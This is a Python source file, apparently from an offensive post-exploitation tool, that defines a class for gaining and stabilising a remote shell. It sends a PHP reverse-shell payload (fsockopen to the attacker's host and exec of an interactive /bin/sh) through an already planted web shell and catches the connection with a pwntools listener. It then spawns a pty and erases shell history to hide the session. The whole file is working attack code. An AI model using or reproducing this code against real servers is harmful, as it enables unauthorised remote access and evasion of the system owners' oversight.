import requests, sys, tty
from config import SHELL_STABILIZATION_METHODS
from pwnlib.tubes.listen import listen


class ShellService:
    def __init__(self, web_shell_url: str, lhost: str, lport: int):
        self.web_shell_url = web_shell_url
        self.lhost = lhost
        self.lport = lport

    def prepare_listener(self) -> listen:
        listener = listen(self.lport)

        return listener

    def execute_rev_shell(self):
        php_code = f'$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'
        payload = requests.utils.quote(f"php -r '{php_code}'")

        try:
            requests.get(f'{self.web_shell_url}?omega={payload}', timeout=2)
        except requests.exceptions.ReadTimeout:
            pass
    
    def stabilize_shell(self, shell: listen):
        shell.sendline(b'export HISTFILE=/dev/null') # Avoid history
        # Get pty
        shell.sendline(f'{self.find_pty_spawn_vector(shell)}; exit'.encode())

        shell.recv(timeout = None) # Wait for pty to spawn
        shell.sendline(b'export HISTFILE=/dev/null')
        shell.sendline(b'stty rows 38 columns 116')
        shell.sendline(b""" alias ls='ls --color=auto'""")
        shell.sendline(b'export TERM=xterm')
        shell.sendline(b'history -c')
        shell.clean()

        tty.setraw(sys.stdin.fileno())
    
    def find_pty_spawn_vector(self, shell: listen) -> str:
        shell.clean()

        for binary in SHELL_STABILIZATION_METHODS:
            shell.sendline(f'which {binary}'.encode())
            result = shell.recvline(timeout=2).decode()
            if(binary in result and 'not found' not in result):
                for shell_binary in SHELL_STABILIZATION_METHODS[binary]:
                    shell.sendline(f'which {shell_binary}'.encode())
                    result = shell.recvline(timeout=2).decode()
                    if(shell_binary in result and 'not found' not in result):
                        return SHELL_STABILIZATION_METHODS[binary][shell_binary]
            shell.clean()
        
        raise Exception('No pty spawn vector found')
